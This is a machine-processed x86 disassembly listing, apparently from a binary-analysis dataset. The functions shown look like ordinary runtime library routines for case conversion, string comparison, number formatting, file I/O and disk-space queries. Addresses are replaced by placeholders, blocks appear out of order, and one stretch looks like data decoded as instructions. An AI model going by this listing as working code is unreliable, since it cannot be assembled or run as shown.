mov [ eax + 0x8 ] ebx
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] sub_4079c4
pop ebx
retn
sub_407a28
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_404114
mov ebx eax
mov eax edi
mov edx ebx
call sub_4044a0
mov edx esi
mov esi [ edi ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al [ edx ]
cmp al 0x61
jb r-xdata
mov [ esi ] al
inc edx
inc esi
dec ebx
test ebx ebx
jne r-xdata
cmp al 0x7a
ja r-xdata
sub al 0x20
sub_407a64
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_404114
mov ebx eax
mov eax edi
mov edx ebx
call sub_4044a0
mov edx esi
mov esi [ edi ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al [ edx ]
cmp al 0x41
jb r-xdata
mov [ esi ] al
inc edx
inc esi
dec ebx
test ebx ebx
jne r-xdata
cmp al 0x5a
ja r-xdata
add al 0x20
sub_407aa0
push esi
push edi
mov esi eax
mov edi edx
or eax eax
je r-xdata
or edx edx
je r-xdata
mov eax [ eax - 0x4 ]
mov ecx eax
cmp ecx edx
jbe r-xdata
mov edx [ edx - 0x4 ]
cmp ecx ecx
[ esi ] [ edi ]
je r-xdata
mov ecx edx
sub eax edx
pop edi
pop esi
retn
movzx eax [ esi - 0x1 ]
movzx edx [ edi - 0x1 ]
sub_407ad0
push esi
push edi
mov esi eax
mov edi edx
mov edx ecx
xor eax eax
and edx 0x3
sar ecx 0x2
js r-xdata
inc eax
[ esi ] [ edi ]
jne r-xdata
pop edi
pop esi
retn
mov ecx edx
[ esi ] [ edi ]
jne r-xdata
sub_407af0
push esi
push edi
push ebx
mov esi eax
mov edi edx
or eax eax
je r-xdata
or edx edx
je r-xdata
mov eax [ eax - 0x4 ]
mov ecx eax
cmp ecx edx
jbe r-xdata
mov edx [ edx - 0x4 ]
cmp ecx ecx
mov ecx edx
sub eax edx
pop ebx
pop edi
pop esi
retn
mov bl [ esi - 0x1 ]
cmp bl 0x61
jb r-xdata
mov bh [ edi - 0x1 ]
cmp bh 0x61
jb r-xdata
cmp bl 0x7a
ja r-xdata
cmp bl bh
je r-xdata
cmp bh 0x7a
ja r-xdata
sub bl 0x20
[ esi ] [ edi ]
je r-xdata
movzx eax bl
movzx edx bh
sub bh 0x20
sub_407b44
cmp eax edx
je r-xdata
mov al 0x1
or eax eax
je r-xdata
retn
or edx edx
je r-xdata
xor eax eax
retn
mov ecx [ eax - 0x4 ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
call sub_407af0
test eax eax
jne r-xdata
sub_407b68
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_404114
mov ebx eax
mov eax esi
call sub_404314
mov edx eax
mov eax edi
mov ecx ebx
call sub_403f44
test ebx ebx
jle r-xdata
pop edi
pop esi
pop ebx
retn
push ebx
mov eax [ edi ]
push eax
call CharUpperBuffA
sub_407b9c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_404114
mov ebx eax
mov eax esi
call sub_404314
mov edx eax
mov eax edi
mov ecx ebx
call sub_403f44
test ebx ebx
jle r-xdata
pop edi
pop esi
pop ebx
retn
push ebx
mov eax [ edi ]
push eax
call CharLowerBuffA
sub_407bd0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_404114
push eax
mov eax esi
call sub_404314
push eax
mov eax ebx
call sub_404114
push eax
mov eax ebx
call sub_404314
push eax
push 0x0
push 0x400
call CompareStringA
sub eax 0x2
pop esi
pop ebx
retn
sub_407c08
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_404114
push eax
mov eax esi
call sub_404314
push eax
mov eax ebx
call sub_404114
push eax
mov eax ebx
call sub_404314
push eax
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
pop esi
pop ebx
retn
sub_407c58
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
push ebx
push edi
push ebx
push esi
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
pop edi
pop esi
pop ebx
retn
sub_407c78
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax edi
call sub_404114
mov esi eax
mov ebx 0x1
jmp r-xdata
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
cmp [ edi + ebx - 0x1 ] 0x20
jbe r-xdata
cmp [ edi + esi - 0x1 ] 0x20
jbe r-xdata
mov eax ebp
call sub_403e54
jmp r-xdata
inc ebx
dec esi
push ebp
mov ecx esi
sub ecx ebx
inc ecx
mov edx ebx
mov eax edi
call sub_404374
pop ebp
pop edi
pop esi
pop ebx
retn
sub_407cc8
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov eax esi
call sub_404114
test eax eax
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov al [ esi ]
add al 0xbf
sub al 0x1a
jb r-xdata
mov eax esi
call sub_404114
sub eax 0x2
jl r-xdata
sub al 0x4
je r-xdata
mov bl 0x1
inc eax
mov edi 0x2
add al 0xfe
sub al 0x1a
jae r-xdata
inc edi
dec eax
jne r-xdata
add dl 0xf9
sub dl 0x1a
jb r-xdata
mov dl [ esi + edi - 0x1 ]
add dl 0xd0
sub dl 0xa
jb r-xdata
sub dl 0x4
je r-xdata
add dl 0xfe
sub dl 0x1a
jae r-xdata
sub_407d2c
or cl cl
jne r-xdata
push edx
push esi
or eax eax
jns sub_407d42
mov [ esi ] dl
or eax eax
jne r-xdata
add dl 0x7
neg eax
call sub_407d42
mov al 0x2d
inc ecx
dec esi
mov [ esi ] al
retn
xor edx edx
div ecx
dec esi
add dl 0x30
cmp dl 0x3a
jb r-xdata
pop ecx
pop edx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
add ecx edx
mov al 0x30
sub esi edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_407d42
mov ecx 0xa
push edx
push esi
mov [ esi ] dl
or eax eax
jne r-xdata
add dl 0x7
xor edx edx
div ecx
dec esi
add dl 0x30
cmp dl 0x3a
jb r-xdata
pop ecx
pop edx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
add ecx edx
mov al 0x30
sub esi edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_407d78
push esi
mov esi esp
sub esp 0x10
xor ecx ecx
push edx
xor edx edx
call sub_407d2c
mov edx esi
pop eax
call sub_403f44
add esp 0x10
pop esi
retn
sub_407d98
or cl cl
jne sub_407dcc
mov ecx 0xa
test [ eax + 0x4 ] 0x80000000
je sub_407dcc
push [ eax + 0x4 ]
push [ eax ]
mov eax esp
neg [ esp ]
adc [ esp + 0x4 ] 0x0
neg [ esp + 0x4 ]
call sub_407dcc
mov [ esi - 0x1 ] 0x2d
dec esi
inc ecx
add esp 0x8
retn
sub_407dcc
push esi
sub esp 0x4
fnstcw [ esp + 0x2 ]
fnstcw [ esp ]
or [ esp ] 0xf00
fldcw [ esp ]
mov [ esp ] cx
fld1
test [ eax + 0x4 ] 0x80000000
je r-xdata
fild [ eax ]
push [ eax + 0x4 ]
push [ eax ]
and [ esp + 0x4 ] 0x7fffffff
push 0x7fffffff
push 0xffffffff
fild [ esp + 0x8 ]
fild [ esp ]
fadd st2
faddp st1
add esp 0x10
jmp r-xdata
mov [ esi ] al
fld st1
fcom st3
fwait
fnstsw ax
sahf
jae r-xdata
add al 0x7
fild [ esp ]
fld st1
dec esi
fprem
fistp [ esp ]
fdiv st1
mov al [ esp ]
add al 0x30
cmp al 0x3a
jb r-xdata
fldcw [ esp + 0x2 ]
add esp 0x4
ffree st3
ffree st2
ffree st1
ffree st0
pop ecx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
sub esi edx
mov al 0x30
add ecx edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_407e64
push ebp
mov ebp esp
push esi
mov esi esp
sub esp 0x20
xor ecx ecx
push eax
xor edx edx
lea eax [ ebp + 0x8 ]
call sub_407d98
mov edx esi
pop eax
call sub_403f44
add esp 0x20
pop esi
pop ebp
retn 0x8
sub_407e8c
cmp edx 0x20
jbe r-xdata
push esi
mov esi esp
sub esp 0x20
push ecx
mov ecx 0x10
call sub_407d2c
mov edx esi
pop eax
call sub_403f44
add esp 0x20
pop esi
retn
xor edx edx
sub_407eb4
push ebx
push esi
add esp 0xfffffff4
mov ebx eax
mov edx esp
mov eax ebx
call sub_402b38
mov esi eax
cmp [ esp ] 0x0
je r-xdata
mov eax esi
add esp 0xc
pop esi
pop ebx
retn
mov [ esp + 0x4 ] ebx
mov [ esp + 0x8 ] 0xb
lea edx [ esp + 0x4 ]
mov eax [ rw-data ]
xor ecx ecx
call sub_407980
sub_407f08
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_402b38
mov [ esi ] eax
cmp [ esp ] 0x0
sete al
pop edx
pop esi
pop ebx
retn
sub_407f28
mov eax [ rw-data ]
call sub_404c4c
test eax eax
jne r-xdata
mov eax [ rw-data ]
call sub_404c4c
test eax eax
jne r-xdata
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_404e08
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_403ea8
retn
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_404e08
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_403ea8
sub_407fb8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x0
mov esi edx
test esi esi
jl r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
mov ebx eax
add ebx 0x4
dec esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebx ]
call sub_407c40
test al al
je r-xdata
sub_407ff4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_40936c
mov edx eax
test dl dl
je r-xdata
call sub_407f28
push ebp
mov eax [ rw-data ]
call sub_404c54
mov edx eax
mov eax [ rw-data ]
call sub_407fb8
pop ecx
mov edx eax
test dl dl
je r-xdata
fld [ ebp - 0x10 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ ebx ]
jmp r-xdata
push ebp
mov eax [ rw-data ]
call sub_404c54
mov edx eax
mov eax [ rw-data ]
call sub_407fb8
pop ecx
mov edx eax
test dl dl
je r-xdata
mov [ ebx ] 0x1
jmp r-xdata
mov eax edx
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebx ] 0x0
sub_408090
push ebx
push esi
mov esi ecx
mov ebx eax
test dl dl
je r-xdata
mov eax esi
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_403ea8
call sub_407f28
test bl bl
je r-xdata
mov eax esi
mov edx [ rw-data ]
mov edx [ edx ]
call sub_403ea8
pop esi
pop ebx
retn
mov eax esi
mov edx [ rw-data ]
mov edx [ edx ]
call sub_403ea8
jmp r-xdata
pop esi
pop ebx
retn
sub_4080e0
push cs
or [ ebx + edx * 2 + 0x74 ] dl
jb r-xdata
sete al
add esp 0x400
pop esi
pop ebx
retn
popad
je r-xdata
inc eax
add al ch
outsb
or [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
xchg esp eax
adc [ eax ] al
add al 0x0
add [ eax ] al
mov eax eax
push ebx
push esi
add esp 0xfffffc00
mov esi eax
mov ebx edx
push 0x400
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx ]
push eax
push esi
call LoadStringA
mov ecx eax
mov edx esp
lea eax [ ebx + 0x4 ]
call sub_403f44
cmp [ ebx + 0x4 ] 0x0
sub_408138
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_4047c0
xor eax eax
push ebp
push sub_40819e
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] ebx
lea eax [ ebp - 0x4 ]
call sub_403e54
lea edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405354
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_403ea8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4081a5
lea eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_404890
retn
sub_4081c0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
or eax 0xffffffff
mov esi ebx
and esi 0x3
cmp esi 0x2
ja r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
and edx 0xf0
cmp edx 0x40
ja r-xdata
push 0x0
push 0x80
push 0x3
push 0x0
mov eax ebx
and eax 0xf0
shr eax 0x4
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi * 4 + rw-data ]
push eax
mov eax edi
call sub_404314
push eax
call CreateFileA
sub_408218
push ebx
mov ebx eax
push 0x0
push 0x80
push 0x2
push 0x0
push 0x0
push 0xc0000000
mov eax ebx
call sub_404314
push eax
call CreateFileA
pop ebx
retn
sub_408244
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push edi
push esi
push ebx
call ReadFile
test eax eax
jne r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_408270
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push edi
push esi
push ebx
call WriteFile
test eax eax
jne r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_40829c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
push esi
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push ebx
call SetFilePointer
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_4082dc
push ebp
mov ebp esp
add esp 0xfffffeb4
push ebx
mov ebx eax
lea eax [ ebp - 0x14c ]
push eax
mov eax ebx
call sub_404314
push eax
call FindFirstFileA
cmp eax 0xffffffff
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
push eax
call FindClose
test [ ebp - 0x14c ] 0x10
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x138 ]
push eax
call FileTimeToLocalFileTime
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x2 ]
push eax
lea eax [ ebp - 0xc ]
push eax
call FileTimeToDosDateTime
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_408354
push ebx
push esi
mov esi eax
mov eax esi
call sub_404114
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop esi
pop ebx
retn
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40bed4
cmp al 0x2
je r-xdata
dec ebx
lea eax [ esi + ebx - 0x1 ]
pop esi
pop ebx
retn
sub_408384
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax esi
call sub_404114
mov edi eax
mov eax ebx
call sub_404314
mov ebp eax
test edi edi
jle r-xdata
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov bl [ esi + edi - 0x1 ]
test bl bl
je r-xdata
dec edi
test edi edi
jg r-xdata
mov edx ebx
mov eax ebp
call sub_408688
test eax eax
je r-xdata
mov edx edi
mov eax esi
call sub_40bed4
cmp al 0x2
jne r-xdata
dec edi
sub_4083d4
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx ebx
mov eax r-xdata
call sub_408384
mov esi eax
push edi
lea edx [ esi + 0x1 ]
mov ecx 0x7fffffff
mov eax ebx
call sub_404374
pop edi
pop esi
pop ebx
retn
sub_40840c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_408384
mov ebx eax
test ebx ebx
jle r-xdata
mov eax edi
call sub_403e54
cmp [ esi + ebx - 0x1 ] 0x2e
jne r-xdata
push edi
mov ecx 0x7fffffff
mov edx ebx
mov eax esi
call sub_404374
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_408454
push ebx
push esi
add esp 0xfffffef8
mov esi edx
mov ebx eax
push esp
lea eax [ esp + 0x8 ]
push eax
push 0x104
mov eax ebx
call sub_404314
push eax
call GetFullPathNameA
mov ecx eax
lea edx [ esp + 0x4 ]
mov eax esi
call sub_403f44
add esp 0x108
pop esi
pop ebx
retn
sub_408490
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
lea edx [ ebp - 0x10 ]
push edx
lea edx [ ebp - 0xc ]
push edx
lea edx [ ebp - 0x8 ]
push edx
lea edx [ ebp - 0x4 ]
push edx
push eax
call GetDiskFreeSpaceA
mov ebx eax
mov eax [ ebp - 0x4 ]
imul [ ebp - 0x8 ]
xor edx edx
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0xc ]
xor edx edx
push edx
push eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_404c28
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov eax [ ebp - 0x10 ]
xor edx edx
push edx
push eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_404c28
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x10
xor eax eax
sub_408540
push edi
push esi
mov esi eax
mov edi edx
mov ecx 0xffffffff
xor al al
[ edi ]
not ecx
mov edi esi
mov esi edx
mov edx ecx
mov eax edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop esi
pop edi
retn
sub_408568
push edi
push esi
push ebx
mov esi eax
mov edi edx
mov ebx ecx
xor al al
test ecx ecx
je r-xdata
sub ebx ecx
mov edi esi
mov esi edx
mov edx edi
mov ecx ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
stosb [ edi ]
mov eax edx
pop ebx
pop esi
pop edi
retn
[ edi ]
jne r-xdata
inc ecx
sub_40859c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
call sub_404114
push eax
mov eax ebx
call sub_404314
mov edx eax
mov eax esi
pop ecx
call sub_408568
pop esi
pop ebx
retn
sub_4085c0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
call sub_404314
mov edx eax
mov ecx edi
mov eax ebx
call sub_408568
pop edi
pop esi
pop ebx
retn
sub_4085e0
push edi
push esi
mov edi edx
mov esi eax
mov ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
mov edi edx
xor edx edx
[ esi ] [ edi ]
mov al [ esi - 0x1 ]
mov dl [ edi - 0x1 ]
sub eax edx
pop esi
pop edi
retn
sub_408604
push edi
push esi
mov edi edx
mov esi eax
mov ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
mov edi edx
xor edx edx
pop esi
pop edi
retn
mov al [ esi - 0x1 ]
cmp al 0x61
jb r-xdata
mov dl [ edi - 0x1 ]
cmp dl 0x61
jb r-xdata
cmp al 0x7a
ja r-xdata
sub eax edx
je r-xdata
cmp dl 0x7a
ja r-xdata
sub al 0x20
[ esi ] [ edi ]
je r-xdata
sub dl 0x20
sub_408644
push edi
push esi
push ebx
mov edi edx
mov esi eax
mov ebx ecx
xor eax eax
or ecx ecx
je r-xdata
pop ebx
pop esi
pop edi
retn
[ edi ]
sub ebx ecx
mov ecx ebx
mov edi edx
xor edx edx
mov al [ esi - 0x1 ]
cmp al 0x61
jb r-xdata
mov dl [ edi - 0x1 ]
cmp dl 0x61
jb r-xdata
cmp al 0x7a
ja r-xdata
sub eax edx
je r-xdata
cmp dl 0x7a
ja r-xdata
sub al 0x20
[ esi ] [ edi ]
je r-xdata
sub dl 0x20
sub_40869c
push edi
push esi
push ebx
or eax eax
je r-xdata
xor eax eax
or edx edx
je r-xdata
mov ebx eax
mov edi edx
xor al al
mov ecx 0xffffffff
[ edi ]
not ecx
dec ecx
je r-xdata
mov esi ecx
mov edi ebx
mov ecx 0xffffffff
[ edi ]
not ecx
sub ecx esi
jbe r-xdata
mov edi ebx
lea ebx [ esi - 0x1 ]
mov eax ecx
push edi
mov ecx ebx
[ esi ] [ edi ]
pop edi
mov ecx eax
jne r-xdata
mov esi edx
lodsb [ esi ]
[ edi ]
jne r-xdata
lea eax [ edi - 0x1 ]
jmp r-xdata
pop ebx
pop esi
pop edi
retn
sub_408724
push ebx
push esi
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
call sub_408504
mov esi eax
inc esi
mov eax esi
call sub_408704
mov ecx esi
mov edx ebx
call sub_408530
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
sub_408760
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx ecx
mov esi edx
mov edi eax
cmp ebx 0x1f
jbe r-xdata
mov edx ebx
dec edx
mov eax esi
call sub_40bef8
cmp al 0x1
jne r-xdata
mov ebx 0x1f
mov eax esp
mov ecx ebx
mov edx esi
call sub_408530
mov [ esp + ebx ] 0x0
mov eax esp
mov [ esp + 0x20 ] eax
mov [ esp + 0x24 ] 0x6
lea edx [ esp + 0x20 ]
mov eax [ edi * 4 + rw-data ]
xor ecx ecx
call sub_407980
add esp 0x28
pop edi
pop esi
pop ebx
retn
dec ebx
sub_4087e8
push ebp
mov ebp esp
add esp 0xffffff94
push ebx
xor ebx ebx
mov [ ebp - 0x14 ] ebx
push ebx
push esi
push edi
mov edi eax
mov esi ecx
xor eax eax
mov [ ebp - 0x4 ] eax
add ecx [ ebp + 0x10 ]
mov [ ebp - 0x8 ] edi
xor eax eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x14 ] eax
mov eax edi
sub eax [ ebp - 0x8 ]
jmp r-xdata
cmp esi ecx
je r-xdata
call sub_408b3f
pop edi
pop esi
pop ebx
pop ebx
mov esp ebp
pop ebp
retn 0xc
lodsb [ esi ]
cmp al 0x25
je r-xdata
cmp esi ecx
je r-xdata
stosb [ edi ]
dec edx
jne r-xdata
lodsb [ esi ]
cmp al 0x25
je r-xdata
lea ebx [ esi - 0x2 ]
mov [ ebp - 0x18 ] ebx
call sub_4088ca
cmp al 0x3a
jne r-xdata
cmp esi ecx
je r-xdata
mov [ ebp - 0x20 ] ebx
mov ebx 0xffffffff
cmp al 0x2e
jne r-xdata
mov [ ebp - 0xc ] ebx
cmp esi ecx
je r-xdata
lodsb [ esi ]
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] esi
push ecx
push edx
call sub_408912
pop edx
mov ebx [ ebp - 0x20 ]
sub ebx ecx
jae r-xdata
cmp esi ecx
je r-xdata
lodsb [ esi ]
jmp r-xdata
cmp [ ebp - 0x19 ] 0x2d
jne r-xdata
xor ebx ebx
lodsb [ esi ]
call sub_4088ca
mov [ ebp - 0x19 ] al
cmp al 0x2d
jne r-xdata
xchg ecx ebx
sub edx ecx
jae r-xdata
sub edx ecx
jae r-xdata
mov al 0x20
[ edi ]
xchg ecx ebx
sub edx ecx
jae r-xdata
add ecx edx
xor edx edx
[ edi ] [ esi ]
add ecx edx
xor edx edx
[ edi ] [ esi ]
cmp [ ebp - 0x10 ] 0x0
je r-xdata
add ecx edx
xor edx edx
pop ecx
mov esi [ ebp - 0x28 ]
jmp r-xdata
push edx
lea eax [ ebp - 0x10 ]
call sub_4087dc
pop edx
or edx edx
je r-xdata
sub_4088ca
xor ebx ebx
cmp al 0x2a
je r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebp + 0x8 ]
jg r-xdata
cmp al 0x30
jb r-xdata
cmp esi ecx
je r-xdata
inc [ ebp - 0xc ]
mov ebx [ ebp + 0xc ]
cmp [ ebx + eax * 8 + 0x4 ] 0x0
mov ebx [ ebx + eax * 8 ]
je r-xdata
retn
cmp al 0x39
ja r-xdata
pop eax
jmp r-xdata
lodsb [ esi ]
xor ebx ebx
imul ebx ebx 0xa
sub al 0x30
movzx eax al
add ebx eax
cmp esi ecx
je r-xdata
mov eax edi
sub eax [ ebp - 0x8 ]
jmp r-xdata
lodsb [ esi ]
jmp r-xdata
call sub_408b3f
pop edi
pop esi
pop ebx
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_408912
and al 0xdf
mov cl al
mov eax 0x1
mov ebx [ ebp - 0xc ]
cmp ebx [ ebp + 0x8 ]
jg r-xdata
call sub_408b3f
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x28 ]
sub ecx edx
mov ebx [ ebp - 0x4 ]
call sub_408760
inc [ ebp - 0xc ]
mov esi [ ebp + 0xc ]
lea esi [ esi + ebx * 8 ]
mov eax [ esi ]
movzx edx [ esi + 0x4 ]
jmp [ edx * 4 + jump_table_408939 ]
mov ebx ecx
sub cl 0x44
je sub_407d98
xor edx edx
xor eax eax
lea esi [ ebp - 0x49 ]
mov edx [ ebp - 0x24 ]
cmp edx 0x20
jbe r-xdata
lea esi [ ebp - 0x59 ]
mov edx [ ebp - 0x24 ]
mov ebx ecx
cmp edx 0x10
jbe r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
mov esi sub_40407c
jmp r-xdata
mov esi sub_4040dc
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x50
jne r-xdata
mov bh 0x1
jmp r-xdata
mov bh 0x0
mov ecx 0x10
cmp bl 0x58
je sub_407d98
sub cl 0x44
je sub_407d2c
xor edx edx
mov ecx 0x1
retn
cmp [ eax ] 0x1
jbe r-xdata
mov esi eax
lodsb [ esi ]
movzx ecx al
jmp r-xdata
add esi [ ebp - 0x4 ]
cmp cl 0x53
jne r-xdata
mov edx eax
lea eax [ ebp - 0x14 ]
push ebx
mov ebx [ ebp - 0x4 ]
call esi
pop ebx
mov esi [ ebp - 0x14 ]
mov eax esi
jmp r-xdata
mov esi eax
mov esi eax
push edi
mov edi eax
xor al al
mov ecx [ ebp - 0x24 ]
jecxz r-xdata
mov edx 0x8
mov ecx 0x10
lea esi [ ebp - 0x59 ]
jmp sub_407d2c
mov esi eax
mov bl 0x0
cmp cl 0x47
je r-xdata
mov eax [ ebp - 0x24 ]
mov edx 0x3
cmp eax 0x12
jbe r-xdata
mov bl 0x1
cmp cl 0x45
je r-xdata
mov ecx 0xa
cmp bl 0x55
je sub_407d98
mov ecx 0x10
cmp bl 0x58
je sub_407d2c
xor ecx ecx
retn
mov edx eax
lea eax [ ebp - 0x10 ]
call sub_4087b8
mov esi [ ebp - 0x10 ]
jmp r-xdata
cmp ecx [ ebp - 0x24 ]
ja r-xdata
or esi esi
je r-xdata
mov ecx [ esi - 0x4 ]
mov ecx edi
sub ecx esi
pop edi
retn
[ edi ]
jne r-xdata
push ebx
push eax
push edx
lea eax [ ebp - 0x69 ]
mov edx esi
movzx ecx bh
mov ebx [ ebp - 0x4 ]
call sub_408cf8
mov ecx eax
lea esi [ ebp - 0x69 ]
retn
mov eax 0xf
mov bl 0x2
cmp cl 0x46
je r-xdata
jmp r-xdata
mov ecx 0xa
cmp bl 0x55
je sub_407d2c
mov ecx [ ebp - 0x24 ]
retn
retn
dec edi
mov eax 0x12
mov edx [ ebp - 0x24 ]
cmp edx eax
jbe r-xdata
mov bl 0x3
cmp cl 0x4e
je r-xdata
jmp r-xdata
mov edx 0x2
cmp cl 0x4d
jne r-xdata
cmp cl 0x4d
jne r-xdata
movzx edx [ rw-data ]
jmp r-xdata
mov bl 0x4
sub_408b60
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
test esi esi
je r-xdata
mov eax esi
call sub_408504
push eax
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov eax ebx
mov edx 0x7fffffff
call sub_4087e8
mov [ ebx + eax ] 0x0
mov eax ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_408ba0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
test esi esi
je r-xdata
mov eax esi
call sub_408504
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov eax ebx
mov edx edi
call sub_4087e8
mov [ ebx + eax ] 0x0
mov eax ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_408bf4
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx 0x1000
mov eax [ ebp - 0x4 ]
call sub_404114
cmp eax 0xc00
jge r-xdata
